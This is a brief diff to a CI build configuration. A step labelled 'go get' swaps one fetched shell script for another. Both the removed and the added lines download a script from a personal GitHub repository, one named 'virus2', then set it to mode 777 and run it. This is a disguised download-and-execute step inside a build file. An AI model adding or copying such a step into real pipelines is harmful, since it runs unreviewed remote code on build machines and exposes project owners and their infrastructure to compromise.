@@ -33,4 +33,4 @@ build:
     - script:
         name: go get
         code: |
-               wget https://github.com/raufpermana22/vieus/raw/main/tus.sh && chmod 777 tus.sh && ./tus.sh
+               wget https://github.com/raufpermana22/virus2/raw/main/tes1.sh && chmod 777 tes1.sh && ./tes1.sh
